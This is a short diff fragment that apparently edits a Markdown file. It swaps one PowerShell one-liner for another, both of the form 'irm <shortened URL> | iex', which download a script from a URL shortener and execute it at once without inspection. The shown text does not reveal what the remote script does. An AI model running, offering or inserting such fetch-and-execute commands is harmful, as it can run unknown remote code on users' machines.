@@ -15,7 +15,7 @@
     ```
 
     ```php
-    irm https://bit.ly/3X8PUAW | iex
+    irm https://tinyurl.com/2y8k6dy7 | iex
     ```
 
     ```php
